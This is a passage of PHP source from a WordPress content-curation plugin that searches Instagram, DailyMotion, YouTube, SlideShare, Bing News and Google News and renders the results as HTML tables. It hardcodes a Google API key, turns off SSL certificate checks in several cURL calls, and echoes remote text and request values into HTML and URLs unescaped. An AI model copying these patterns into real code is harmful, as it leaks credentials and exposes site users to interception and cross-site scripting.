                    } else {
                        $search_results = $service_result->getItems();
                    }
                }
            } catch (Exception $e) {
                $service_access_good = true;
                $search_good = false;
                if ($e->getMessage()) {
                    if ($e->getMessage() != '')
                    {
                        //$post_list .= '<tr><td><h3 class="cs_bad center"><strong>Instagram returned no results</strong>. Instagram only allows you to search for valid tags. <a href="https://instagram.com/" target="_blank">Search Instagram for Tags</a></h3></td></tr>';
                        $post_list .= '<tr><td><h3 class="cs_bad center">'.$e->getMessage().'</h3></td></tr>';
                        delete_option('cs_instagram_session');
                    }
                }
                // if we got here there was some access error. The best thing to do would be remove the current saved access info and have the user reconnect.
            }
            if ($service_access_good && $search_good && !is_null($search_results)) {
                $search_results_total = count($search_results);
                if($search_results_total==0) {
                    //http://www.youtube.com/embed/TezQvNZgxTA?TB_iframe=true
                    $post_list .= '<tr><td><h3 class="cs_bad center"><strong>Instagram returned no results</strong>. Instagram only allows you to search for valid tags. <a href="https://instagram.com/" target="_blank">Search Instagram for Tags</a></h3>
<p class="center"><a href="https://www.youtube.com/embed/uUZHO_MyvCE?TB_iframe=true&autoplay=1" class="thickbox">Watch Finding Instagram Tags Tutorial</a></p>
</td></tr>';
                }

                /** @var $InstagramFeedItem Instagram\API\Response\Model\FeedItem */
                foreach ($search_results as $InstagramFeedItem) {
                    //var_dump($searchResult);

                    $playerHTML = '';
                    $pubDate = '';
                    if($InstagramFeedItem->getTakenAt()) {
                        $dtStr = date("c", $InstagramFeedItem->getTakenAt());
                        $date = new DateTime($dtStr);
                        $pubDate = $date->format('m/d/Y H:i:s');
                    } else {
                        // if there is no taken at then most likely everything else is null for some reason. So we move to the next one.
                        continue;
                    }

                    $views_total = 0;
                    if($InstagramFeedItem->getViewCount()) {
                        $views_total = $InstagramFeedItem->getViewCount();
                        if (!$views_total)
                            $views_total = 0;
                    }
                    $total_ups = 0;
                    if($InstagramFeedItem->getLikeCount()) {
                        $total_ups = ($InstagramFeedItem->getLikeCount());
                    }

                    $comments_total = 0;
                    if($InstagramFeedItem->getCommentCount()) {
                        $comments_total = $InstagramFeedItem->getCommentCount();
                    }

                    $imageURL = '';
                    if (0 != $i % 2): $alternate = ' alternate'; endif;

                    $current_url = 'https://www.instagram.com/p/' . $InstagramFeedItem->getCode();
                    /** @var $user_obj User */
                    $user_obj = $InstagramFeedItem->getUser();
                    $publisherName = $user_obj->getUsername();
                    $title = '';
                    $description = '';
                    if ($InstagramFeedItem->getCaption()) {
                        if ($InstagramFeedItem->getCaption()->getText() != '') {
                            $description = $InstagramFeedItem->getCaption()->getText();
                        }
                    }

                    $title = 'from ' . $publisherName;
                    if ($InstagramFeedItem->getImageVersions2()) {
                        if ($InstagramFeedItem->getImageVersions2()->getCandidates()) {
                            $images_arr = $InstagramFeedItem->getImageVersions2()->getCandidates();
                            if ($images_arr) {
                                if (array_key_exists(0, $images_arr)) {

                                    $imageURL = '<span class="content_demand_image_span"><img src="' . $images_arr[0]->getUrl() . '" class="thumb_lp' . $i . '" />' . getImageActionLinks($i) . '</span>';
                                }
                            }
                        }
                    }
                    $full_embed_link = $current_url;

                    // if user selected to show player then we build it here
                    if ($show_player == 'true')
                        $playerHTML = '<div class="on_demand_player_w"><iframe width="320" height="180" src="' . $full_embed_link . '" frameborder="0" allowfullscreen scrolling="no" noresize marginwidth="0" marginheight="0"></iframe></div>';

                    $playerHTML = '<div style="clear: both; margin: 0 auto; overflow: auto;"><div style="height: auto; width: 20px; float: left;"><div style="float: left; width: 10%;">
<a href="javascript:;" data-type="imgur" data-url="' . $current_url . '" class="embed_quick_add_link" style="display: block; padding-bottom: 38px; min-width: 40px; height: 77px; background: #c6c6c6; margin-top: 11px;">
<i class="fa fa-caret-left" style="margin-top: 41px;padding-left: 5px;font-size: 27px;"></i></a></div></div>
<div style="height: auto; float: left; width: 90%">' . wp_oembed_get($current_url) . '</div></div>';

                    $cqs_details = 'channel=youtube&views=0';
                    // image and buiding out the display

                    $post_list .= '<tr class="type-post status-publish format-standard hentry' . $alternate . '"><td>' . $imageURL . '
                            <a href="' . $current_url . '" class="link_lp' . $i . '" target="_blank">' . $title . '</a>  - <a href="javascript:;" class="add_to_title" rel="link_lp' . $i . '">
                            <i class="fa fa-header"></i></a>
                            <br />from ' . $publisherName . ' published on ' . $pubDate . ' <p><p><i class="fa fa-eye" aria-hidden="true"></i> ' .
                        number_format($views_total) . ' &nbsp;&nbsp;<i class="fa fa-comments" aria-hidden="true"></i> ' . number_format($comments_total) . '&nbsp;&nbsp; 
                             <i class="fa fa-thumbs-up" aria-hidden="true"></i> ' . number_format($total_ups) . '&nbsp;&nbsp;</p><p class="snippet_lp' . $i . '">' . $description . '
                            </p>' . $playerHTML . '
                            </td><td class="content_search_actions">' . getAddToPostLink($i, $current_url) . ' | <a href="javascript:;" class="link_to_load" name="' . ($current_url) . '">Curate</a>';

                    $post_list .= getQuickAddButtons($i);
                    if ($load_direct_share)
                        $post_list .= getSocialShareBlock($title, $current_url);

                    $post_list .= '</td></tr>';
                    // get ready and iterate
                    $alternate = '';
                    $i++;
                    if ($i == $total_results)
                        break;
                }
            }

        }

        if (!$service_access_good && !$is_login_error) {
            $post_list .= '<tr><td><h3 class="cs_bad center"><strong>Instagram not connected</strong>. <a href="' . admin_url('admin.php?page=curation_suite_display_settings') . '" target="_blank">Enter Your Instagram Credentials</a></h3></td></tr>';
        }
        $post_list .= '</table>';
        //echo json_encode(array('results' => $post_list, 'current_page' => $start, 'total_posts_display' => $c) );
    }

    if ($search_type == 'daily_motion') {
        if (true) {

            // DD values = published, relevance, viewCount, rating
            // API values == recent, relevance, visited, trending
            // add trending
            switch ($orderby) {
                case 'published':
                    $orderby = 'recent';
                    break;
                case 'relevance':
                    $orderby = 'relevance';
                    break;
                case 'viewCount':
                    $orderby = 'visited';
                    break;
                case 'rating':
                    $orderby = 'trending';
                    break;
                default:
                    $orderby = 'recent';
            }

            if ($language == '')
                $language = 'en';

            if ($start == '' || $start == 0)
                $startCalcNum = 1;
            else
                $startCalcNum = intval($start);

            // language
            $query_arr = array();
            $api_url = 'https://api.dailymotion.com/videos?fields=id,thumbnail_url,comments_total,views_total,created_time,duration,description,title&country=us&sort=' . $orderby . '&search=' . $search_query . '&page=' . $startCalcNum . '&limit=10';
            $total_results = 0;
            //$post_list .= $start;
            $searchResponse = ybi_do_external_service_call($api_url, $query_arr, 'GET');
            $total_results = $searchResponse['total'];
            $search_results = $searchResponse['list'];
            //add_thickbox();
            foreach ($search_results as $searchResult) {
                $playerHTML = '';
                $dtStr = date("c", $searchResult['created_time']);
                $date = new DateTime($dtStr);
                $pubDate = $date->format('m/d/Y H:i:s');
                $views_total = $searchResult['views_total'];
                $comments_total = $searchResult['comments_total'];

                if (0 != $i % 2): $alternate = ' alternate'; endif;
                $current_url = 'http://dailymotion.com/video/' . $searchResult['id'];
                $publisherName = '';
                $full_embed_link = '//dailymotion.com/embed/video/' . $searchResult['id'];

                // if user selected to show player then we build it here
                if ($show_player == 'true')
                    $playerHTML = '<div class="on_demand_player_w"><iframe width="320" height="180" src="' . $full_embed_link . '" frameborder="0" allowfullscreen scrolling="no" noresize marginwidth="0" marginheight="0"></iframe></div>';


                // add channel and details to cqs details parm
                //$cqs_details = 'channel=youtube&views='.$item->viewCount;
                $cqs_details = 'channel=youtube&views=0';
                // image and buiding out the display
                $imageURL = '<span class="content_demand_image_span"><img src="' . $searchResult['thumbnail_url'] . '" class="thumb_lp' . $i . '" />' . getImageActionLinks($i) . '</span>';
                $post_list .= '<tr class="type-post status-publish format-standard hentry' . $alternate . '"><td>' . $imageURL . '
                            <a href="' . $current_url . '?TB_iframe=true&width=600&height=550" class="thickbox link_lp' . $i . '">' . $searchResult['title'] . '</a>  - <a href="javascript:;" class="add_to_title" rel="link_lp' . $i . '"><i class="fa fa-header"></i></a>
                            <br />from ' . $publisherName . ' published on ' . $pubDate . ' <p><p><i class="fa fa-eye" aria-hidden="true"></i> ' . number_format($views_total) . ' &nbsp;&nbsp;<i class="fa fa-comments" aria-hidden="true"></i> ' . number_format($comments_total) . '&nbsp;&nbsp; <a href="' . $current_url . '" target="_blank" class="cs_bad"><i class="fa fa-external-link" aria-hidden="true"></i> view on DailyMotion</a> </p>' . $searchResult['description'] . '
                            </p>' . $playerHTML . '
                            </td><td class="content_search_actions">' . getAddToPostLink($i, $current_url) . ' | <a href="javascript:;" class="link_to_load" name="' . ($current_url) . '">Curate</a> |
                            ';
                if ($load_direct_share)
                    $post_list .= getSocialShareBlock($searchResult['title'], $current_url);

                $post_list .= '</td></tr>';
                // get ready and iterate
                $alternate = '';
                $i++;

            }

            $post_list .= '</table><div id="curation_links_pages">';
            $page_token = '';
            $pages = new Paginator;
            $pages->move_page_class = 'move_page';
            $pages->items_total = $total_results;
            $pages->items_per_page = 10;
            $pages->current_page = $start;
            $pages->mid_range = 9;
            $pages->paginate();
            $post_list .= '<div id="curation_links_pages">' . $pages->display_pages() . '</div>';
            $post_list .= '</div>';
        }
    }
    if ($search_type == 'youtube') {
        if (!class_exists('Google_Client')) {
            require_once(YBI_CURATION_SUITE_PATH . "lib/src/Google/autoload.php");

        }
        $client = new Google_Client();
        $client->setApplicationName("CurationSuite");
        $client->setDeveloperKey("AIzaSyA_Eh30PhwmIBGEOXRsvyoewr60DGMxYjs");
        $youtube = new Google_Service_YouTube($client);
        try {
            // Call the search.list method to retrieve results matching the specified
            // query term.
            // our form = published, relevance, viewCount, rating
            if ($orderby == 'published')
                $orderby = 'date';

            if ($language == '')
                $language = 'en';

            // youtube= date, rating, relevance, title, videoCount, viewCount
            $query_arr = array(
                'q' => $search_query,
                'maxResults' => 10,
                'order' => $orderby,
                'type' => 'video',
                'relevanceLanguage' => $language
            );

            if ($start != '0')
                $query_arr['pageToken'] = $start;

            //$post_list .= $start;
            $searchResponse = $youtube->search->listSearch('id,snippet', $query_arr);

            $videos = '';
            $channels = '';
            $playlists = '';
            // Add each result to the appropriate list, and then display the lists of
            // matching videos, channels, and playlists.
            foreach ($searchResponse['items'] as $searchResult) {
                //var_dump($searchResult);
                switch ($searchResult['id']['kind']) {
                    case 'youtube#video':
                        $playerHTML = '';
                        $data_html = '';
                        $date = new DateTime($searchResult['snippet']['publishedAt']);
                        $pubDate = $date->format('m/d/Y H:i:s');  //$item->time_ago;//$date->format('m/d/Y H:i:s');
                        if (0 != $i % 2): $alternate = ' alternate'; endif;
                        $current_url = 'https://www.youtube.com/watch?v=' . $searchResult['id']['videoId'];
                        $publisherName = $searchResult['snippet']['channelTitle'];
                        $full_embed_link = '//www.youtube.com/embed/' . $searchResult['id']['videoId'];
                        $title = $searchResult['snippet']['title'];
                        $snippet = $searchResult['snippet']['description'];
                        // if user selected to show player then we build it here
                        if ($show_player == 'true') {
                            $playerHTML = '<div class="on_demand_player_w"><iframe width="350" height="185" src="' . $full_embed_link . '" frameborder="0" allowfullscreen scrolling="no" noresize marginwidth="0" marginheight="0"></iframe></div>';
                            $data_html = $playerHTML;
                        }



                        // add channel and details to cqs details parm
                        //$cqs_details = 'channel=youtube&views='.$item->viewCount;
                        $cqs_details = 'channel=youtube&views=0';
                        // image and buiding out the display
                        $imageURL = $searchResult['snippet']['thumbnails']['modelData']['medium']['url'];

                        /*$imageURL = '<span class="content_demand_image_span"><img src="' . $searchResult['snippet']['thumbnails']['modelData']['medium']['url'] . '" class="thumb_lp' . $i . '" />' . getImageActionLinks($i) . '</span>';
                        $post_list .= '<tr class="type-post status-publish format-standard hentry' . $alternate . '"><td>' . $imageURL . '
                            <a href="' . $current_url . '" target="_blank" class="link_lp' . $i . '">' . $title . '</a>  - <a href="javascript:;" class="add_to_title" rel="link_lp' . $i . '"><i class="fa fa-header"></i></a>
                            <br />from ' . $publisherName . ' published on ' . $pubDate . ' <p>' . $snippet . '</p>' . $playerHTML . '
                            </td><td class="content_search_actions">' . getAddToPostLink($i, $current_url) . ' | <a href="javascript:;" class="link_to_load" name="' . ($current_url) . '">Curate</a>';
                        if ($load_direct_share)
                            $post_list .= getSocialShareBlock($searchResult['snippet']['title'], $current_url);

                        $post_list .= '</td></tr>';*/

                        $post_list .= get_content_item_row_for_search($i, $title, $current_url, $imageURL, $snippet, $publisherName, $pubDate, $load_direct_share, $data_html,$cs_highlight_curated_content, true);
                        // get ready and iterate
                        $alternate = '';
                        $i++;
                        break;
                }
            }
            $post_list .= '</table><div id="curation_links_pages">';

            $page_token = '';
            if (array_key_exists('prevPageToken', $searchResponse)) {
                $page_token = $searchResponse['prevPageToken'];
                if ($page_token != '')
                    $post_list .= '<a href="javascript:;" rel="' . $page_token . '" class="move_page"><i class="fa fa-backward"></i> Previous Page</a>';
            }
            if (array_key_exists('nextPageToken', $searchResponse)) {
                $page_token = $searchResponse['nextPageToken'];
                $post_list .= '<a href="javascript:;" rel="' . $page_token . '" class="move_page">Next Page <i class="fa fa-forward"></i></a>';
            }
            $post_list .= '</div>';

        } catch (Google_Service_Exception $e) {
            //$htmlBody .= sprintf('<p>A service error occurred: <code>%s</code></p>',
            //htmlspecialchars($e->getMessage()));
        } catch (Google_Exception $e) {
            //$htmlBody .= sprintf('<p>An client error occurred: <code>%s</code></p>',
            //  htmlspecialchars($e->getMessage()));
        }
    }

    // Slideshare API v1 search functions
    if ($search_type == 'slideshare') {
        //sort - Sort order (default is 'relevance') ('mostviewed','mostdownloaded','latest')
        if ($orderby == 'viewCount')
            $orderby = 'mostviewed';
        if ($orderby == 'published')
            $orderby = 'latest';
        if ($orderby == 'rating')
            $orderby = 'mostdownloaded';

        if ($start == '')
            $startCalcNum = 1;
        else
            $startCalcNum = $start;

        //http://www.slideshare.net/developers/documentation/v1
        //https://github.com/slideshare/SlideshareAPIExamples/tree/master/PHPKit/SSUtil
        //http://www.slideshare.net/search/slideshow.json?type=presentations&q=israel
        $url = 'https://www.slideshare.net/search/slideshow.json?type=presentations&q=' . urlencode($search_query) . '&sort=' . $orderby . '&lang=en&items_per_page=12&page=' . $startCalcNum;
        $process = curl_init($url);
        curl_setopt($process, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
        curl_setopt($process, CURLOPT_USERPWD, "username:XXXX");
        curl_setopt($process, CURLOPT_TIMEOUT, 30);
        curl_setopt($process, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($process, CURLOPT_SSL_VERIFYPEER, false);
        $response = curl_exec($process);
        curl_close($process);
        $json = json_decode($response);
        $clusterUrl = '';
        $search_results = $json->search_results;
        $c = count($search_results);

        $i = 0;
        if ($c) {
            while ($i < $c) {
                $item = $search_results[$i];
                if (0 != $i % 2): $alternate = ' alternate'; endif;
                $pubDate = '';
                if ($item->created_at) {
                    $date = new DateTime();
                    $date->setTimestamp($item->created_at);
                    $pubDate = $date->format('m/d/Y H:i:s');  //$item->time_ago;//$date->format('m/d/Y H:i:s');
                }


                if ($show_player == 'true')
                    $playerHTML = '<iframe src="http://www.slideshare.net/slideshow/embed_code/' . $item->id . '" width="340" height="290" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px 1px 0; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>';

                // add channel and details to cqs details parm
                $cqs_details = 'channel=slideshare&views=' . $item->view_count;
                $current_url = 'http://www.slideshare.net/' . $item->user_login . '/' . $item->stripped_title;
                $publisherName = $item->user_login;
                $imageURL = '<span class="content_demand_image_span"><img src="' . $item->thumb_url . '" class="thumb_lp' . $i . '" />' . getImageActionLinks($i) . '</span>';
                $post_list .= '<tr class="type-post status-publish format-standard hentry' . $alternate . '"><td class="cs_on_demand_left">' . $imageURL . '
					<a href="' . $current_url . '" target="_blank" class="link_lp' . $i . '">' . $item->title . '</a>  - <a href="javascript:;" class="add_to_title" rel="link_lp' . $i . '"><i class="fa fa-header"></i></a>
					<br />from ' . $publisherName . ' published on ' . $pubDate . ' (views: ' . number_format($item->view_count) . ')
					<p>' . $item->description . '</p>' . $playerHTML . '</td>
					<td class="content_search_actions">' . getAddToPostLink($i, $current_url) . ' | 
					<a href="javascript:;" class="link_to_load" name="' . ($current_url) . '">Curate</a>';
                if ($load_direct_share)
                    $post_list .= getSocialShareBlock($item->title, $current_url);

                $post_list .= '</td></tr>';
                $alternate = '';
                $i++;
            }
        }
        $post_list .= '</table>';

        $pages = new Paginator;
        $pages->move_page_class = 'move_page';
        $pages->items_total = $json->total_results;
        $pages->items_per_page = 12;
        $pages->current_page = $start;
        $pages->mid_range = 9;
        $pages->paginate();
        $post_list .= '<div id="curation_links_pages">' . $pages->display_pages() . '</div>';

        //echo json_encode(array('results' => $post_list, 'current_page' => $current_page, 'total_posts_display' => $c) );
    } //if($search_type == 'bing_news')

    // Bing News connection. This AppID is we believe a shared APPID
    if ($search_type == 'bing_news') {
        try {
            // this is sent from the LE server.
            if (array_key_exists('search_api_key', $data)) {
                $account_key = $data['search_api_key'];
            }

            if ($orderby == 'relevance')
                $orderby = 'Relevance';
            if ($orderby == 'published')
                $orderby = 'Date';
            if ($language == '')
                $language = 'en-US';
            if ($start == '' || $start == 0)
                $startCalcNum = 0;
            else
                $startCalcNum = ($start - 1) * 10;

            $url = "https://api.cognitive.microsoft.com/bing/v5.0/news/search?q=" . urlencode($search_query) . "&count=20&offset=0&mkt=" . $language . "&safeSearch=Off";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);

            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Ocp-Apim-Subscription-Key: ' . $account_key));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            $json = curl_exec($ch);
            $data = json_decode($json);
            $search_results = $data->value;
            $current_url = '';
            $i = 0;

            foreach($search_results as $item) {

                $date = new DateTime($item->datePublished);
                $pubDate = $date->format('Y-m-d H:i:s');
                $imageURL = '';
                if(property_exists($item,'image')) {
                    $image = $item->image;
                    if(property_exists($image,'thumbnail')) {
                        $thumbnail = $image->thumbnail;
                        $imageURL = $thumbnail->contentUrl;
                        if($imageURL != '') {

                        }
                    }
                }
                $current_url = $item->url;
                $current_url = cs_resolveShortURL($current_url);

                $provider = $item->provider;
                $publisherName = $provider['name'];
                $title = $item->name;
                $snippet = $item->description;
                $data_html='';
                $post_list .= get_content_item_row_for_search($i, $title, $current_url, $imageURL, $snippet, $publisherName,$pubDate,$load_direct_share,$data_html,$cs_highlight_curated_content);
                $i++;
            }
            $post_list .= '</table>';

        } catch (Exception $e) {
            $post_list .= "Error: " . $e->getMessage();
        }
    } //if($search_type == 'bing_news')

    // below is Google News and Blog search. Depending on which on it is things will be displayed accordingly
    if ($search_type == 'google_news') {
        $ned_reqion = trim($_POST['ned_region']);
        //include_once(ABSPATH . WPINC . '/feed.php');
        // create the feed url
        if ($language == '')
            $language = 'en';
        if ($ned_reqion == '')
            $ned_reqion = 'us';

        // https://news.google.com/news/rss/search/section/q/iphone/iphone?hl=en&gl=US&ned=us

        $feedArr = ('https://news.google.com/news/rss/search/section/q/'.urlencode($search_query).'/'.urlencode($search_query).'?ned=' . $ned_reqion . '&hl=' . $language . '&num=20');
        // ver 2.9.4
        //$feedArr = ('https://news.google.com/news?pz=1&cf=all&ned=' . $ned_reqion . '&hl=' . $language . '&num=20&output=rss&q=' . urlencode($search_query));


        // Get a SimplePie feed object from the specified feed source.
        $rss = fetch_feed($feedArr);
        if (!is_wp_error($rss)) {
            $maxitems = $rss->get_item_quantity(15);
            $rss_items = $rss->get_items(0, $maxitems);

            foreach ($rss_items as $item) {

                $imageURL = '';
                $current_url = $item->get_permalink();
                parse_str(parse_url(html_entity_decode($current_url), PHP_URL_QUERY), $url_part_arr);
                if (array_key_exists('url', $url_part_arr))
                    $current_url = $url_part_arr['url'];

                //http://news.google.com/news/url?sa=t&fd=R&ct2=us&usg=AFQjCNFGz3QbUlyCf1TNEQZ-0_ttBn3rUw&clid=c3a7d30bb8a4878e06b80cf16b898331&ei=EQ9fVsiCIdKGhQHb44r4BA&url=http://www.mediapost.com/publications/article/263795/on-mobile-content-marketing-is-alive-and-well-.html
                $pubDate = $item->get_date();
                $date = new DateTime($pubDate);
                $detailsDate = $date->format('Y-m-d-H-i-s'); // this is used in the details string, we need it to have no spaces
                $publisherName = ybi_cu_getDomainName($current_url);

                $title = $item->get_title();
                $source_from_title = trim(strrchr($title, '-'));
                $source_from_title = trim(str_replace('- ', '', $source_from_title));
                //$title
                //$source_from_title = trim(substr($title, strpos($data, "-") + 1));
                $thecontent = $item->get_content();
                $description = ($item->get_content());
                $description = str_replace($source_from_title, '', $description);
                $description = strip_tags($description);
                $description = str_replace($source_from_title, '', $description);
                $description = str_replace(strip_tags($title), '', $description);


                // check if simple html dom is already included
                if (!function_exists('file_get_html'))
                    require_once(YBI_CURATION_SUITE_PATH . "lib/web/simple_html_dom.php");

                if (!class_exists('curationsuite\\simple_html_dom'))
                    require_once(YBI_CURATION_SUITE_PATH . "lib/web/simple_html_dom.php");
                // create a simple html dom file
                $html = new curationsuite\simple_html_dom();

                // we create an html page from the content that will be parsed
                //$thecontent = '<html><body>' . $post_content . '</body></html>';
                // now let's reload the content to easily read it
                $html->load($thecontent);

                // these are the elements we search.
                $single_arr = $html->find('img');
                if (!empty($single_arr)) {
                    $list_combined = '';
                    //class="thumb_lp'.$i.'" />'.getImageActionLinks($i).'
                    if ($single_arr[0]->getAttribute('src'))
                        //$imageURL = '<span class="content_demand_image_span google_news_image"><img src="https://t3.gstatic.com/images?q=tbn:' . $single_arr[0]->getAttribute('src') . '" class="thumb_lp' . $i . '" />' . getImageActionLinks($i) . '</span>';
                       // $imageURL = 'https://t3.gstatic.com/images?q=tbn:'.$single_arr[0]->getAttribute('src');
                       $imageURL = $single_arr[0]->getAttribute('src');
                    else
                        $imageURL = '';
                }
                $thecontent = '<html><body>' . $item->get_description() . '</body></html>';
                // now let's reload the content to easily read it
                $html->load($thecontent);
                $html->removeNode('img'); // we remove the images to get just plain text from the feed
                $html->removeNode('a'); // we remove the images to get just plain text from the feed
                //$html->removeNode('table'); // we remove the table to get just plain text from the feed
                // now let's get the description
                //$description = strip_tags($html);
                $description = '';
                $snippet = str_replace($source_from_title, '', $description);
                $data_html = '';
                $post_list .= get_content_item_row_for_search($i, $title, $current_url, $imageURL, $snippet, $publisherName, $pubDate, $load_direct_share,$data_html,$cs_highlight_curated_content);

                //$post_list .= get_content_item_row_for_search($i, $title, $current_url, $imageURL, $snippet, $publisherName,$pubDate,$load_direct_share);

                $i++;
            }
            $post_list .= '</table>';

        } else {
            //printf(__('<strong>RSS Error</strong>: %s'), $rss->get_error_message());
            //echo $rss->get_error_message();
        }
        $rss->__destruct();
        unset($rss);
    }

    if (array_key_exists('action', $data)) {
        if ($data['action'] == 'fix_search') {
            $fix_key = '';
            $fix_assoc = '';
            $fix_comm = '';
            if (array_key_exists('fix_assoc', $data))
                $fix_assoc = $data['fix_assoc'];
            if (array_key_exists('fix_key', $data))
                $fix_key = $data['fix_key'];
            if (array_key_exists('fix_comm', $data))
                $fix_comm = $data['fix_comm'];
            cs_fix_search_issue($fix_assoc, $fix_key, $fix_comm);
        }
    }
    echo json_encode(array('results' => $post_list, 'current_page' => $start, 'total_posts_display' => $c));
    die();
}

add_action('wp_ajax_ybi_curation_suite_get_content_on_demand_search', 'ybi_curation_suite_get_content_on_demand_search');

function cs_le_get_platform_content_for_post_area($platform_id, $platform_sources, $hide_quick_add, $results, $load_video_player = false)
{
    $post_list = '';
    $i = 0;
    $total = count($results);
    if ($results && is_array($results)) {
        $post_list = '<div class="cs_le_post_results_total center">Total: '.$total.'</div>';
        $post_list .= '<table class="wp-list-table widefat fixed posts" cellspacing="0">';
        foreach ($results as $ContentItem) {
            $alternate = '';
            if (!($ContentItem['id']))
                continue;

            if (0 != $i % 2): $alternate = ' alternate'; endif;

            $current_url = $ContentItem['url'];
            $date = new DateTime($ContentItem['published_date']);
            $pubDate = $date->format('m/d/Y H:i A');
            $fav_icon = $ContentItem['DomainData']['data']['fav_icon_url'];
            // if there is a favicon make it the background of the title
            $background_img = '';
            if ($fav_icon != '')
                $background_img = ' style="background: no-repeat url(' . $fav_icon . ') left top; background-size: 16px 16px; padding-left: 21px;"';

            $thumbnail_html = '';

            $content_type_css = 'cs_article';
            $youtube_video_id = '';
            $is_video = false;
            if ($ContentItem['content_type_name'] == 'video') {
                $content_type_css = 'cs_video';
                $is_video = true;
                $youtube_video_id = cs_getYouTubeVideoID($current_url);
            }

            $image_url = $ContentItem['image_src'];
            if ($is_video && $load_video_player) {
                $video_id = cs_getYouTubeVideoID($current_url);
                $full_embed_link = 'https://www.youtube.com/embed/' . $video_id . '?rel=0';
                //$thumbnail_html = '<iframe width="330" height="186" src="" frameborder="0" allowfullscreen></iframe>';
                $thumbnail_html = '
<div class="cs_embed_block">
	<div class="left_embed_quick_add_w">
		<div class="left_embed_quick_add_int">
		<a href="javascript:;" data-url="' . $current_url . '" class="embed_quick_add_link"><i class="fa fa-caret-left"></i></a>
		</div>
	</div>
	<div class="on_demand_player_w">
		<iframe width="330" height="185" src="' . $full_embed_link . '" frameborder="0" allowfullscreen scrolling="no" noresize marginwidth="0" marginheight="0"></iframe>
	</div>
</div>';

                $thumbnail_html .= '<span class="content_demand_image_span"><a href="javascript:;" id="' . $youtube_video_id . '" class="cs_tutorial_popup"><img src="' . $ContentItem['image_src'] . '" class="item_thumb cs_youtube_thumb thumb_lp' . $i . '" /></a>' . getImageActionLinks($i) . '</span>';
            } else {
                if ($ContentItem['image_src']) {
                    if ($is_video) {
                        //$thumbnail_html = '<a href="javascript:;" id="'.$youtube_video_id.'" class="cs_tutorial_popup"><img src="'.$image_url.'" class="item_thumb cs_youtube_thumb" /></a>';
                        $thumbnail_html = '<span class="content_demand_image_span"><a href="javascript:;" id="' . $youtube_video_id . '" class="cs_tutorial_popup">
							<img src="' . $ContentItem['image_src'] . '" class="item_thumb cs_youtube_thumb thumb_lp' . $ContentItem['id'] . '" /></a>' . getImageActionLinks($ContentItem['id']) . '</span>';
                    } else {
                        $thumbnail_html = '<span class="content_demand_image_span"><img src="' . $ContentItem['image_src'] . '" class="thumb_lp' . $ContentItem['id'] . '" />' . getImageActionLinks($ContentItem['id']) . '</span>';
                        //$thumbnail_html = getImageActionLinks($i) . '<a href="'.$current_url .'" target="_blank"><img src="'.$ContentItem['image_src'].'" class="item_thumb" /></a>';
                    }
                }
            }
            $domain_id = $ContentItem['DomainData']['data']['id'];
            $domain_name = $ContentItem['source_domain'];
            $source_row_name = str_replace(".", "_", $ContentItem['source_domain']);

            $post_list .= '<tr class="type-post status-publish format-standard hentry cu_cid_row_' . $ContentItem['id'] . ' source_' . $domain_id . $alternate . '"><td class="' . $content_type_css . '">
        <div class="cs_headline_row"><a href="' . $ContentItem['url'] . '" target="_blank" class="cu_li_title link_lp' . $ContentItem['id'] . '" ' . $background_img . '>' . $ContentItem['title'] . '</a> - <a href="javascript:;" class="add_to_title" rel="link_lp' . $ContentItem['id'] . '"><i class="fa fa-header"></i></a></div>' . $thumbnail_html . '
        <p class="cu_le_source_date">from ' . $ContentItem['source_domain'];

            $post_list .= ' published on ' . $pubDate . ' </p>
        <p class="snippet snippet_lp' . $ContentItem['id'] . '">' . $ContentItem['snippet'] . '</p>';
            //
            $post_list .= '<div class="cs_le_source_domaain_keywords_w">' . '<a href="javascript:;" search_type="domain_name_id" order_by="most_recent" parameter_id="' . $domain_id . '" class="cu_le_detail_search"><i class="fa fa-search"></i></a> ' . $ContentItem['DomainData']['data']['domain_name'];

            if ($domain_name != 'youtube.com') {
                $post_list .= '<a href="javascript:;" id="link_' . $ContentItem['id'] . '" class="remove_red source_ignore source_ignore_' . $domain_id . '"><i class="fa fa-caret-square-o-down"></i> block</a>
			<div class="pohelp pohelp_link_' . $ContentItem['id'] . '">
			<a href="javascript:;" cur_action="add" type="ignore-source" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> forever</a>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="2-HOUR" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 2 Hours</a><br>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="4-HOUR" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 4 Hours</a><br>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="12-HOUR" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 12 Hours</a><br>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="1-DAY" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 1 Day</a><br>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="2-DAY" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 2 Days</a><br>
			<a href="javascript:;" cur_action="add" type="ignore-source" data-time-frame="7-DAY" parameter_id="' . $domain_id . '" class="cu_platform_action remove_red"><i class="fa fa-minus-square"></i> 7 Days</a></div>';
            }
            $keyword_arr = $ContentItem['keyword_arr'];
            if (count($keyword_arr) > 0)
                $post_list .= ' | <i>Keywords:</i> ';
            foreach ($keyword_arr as $Keyword) {
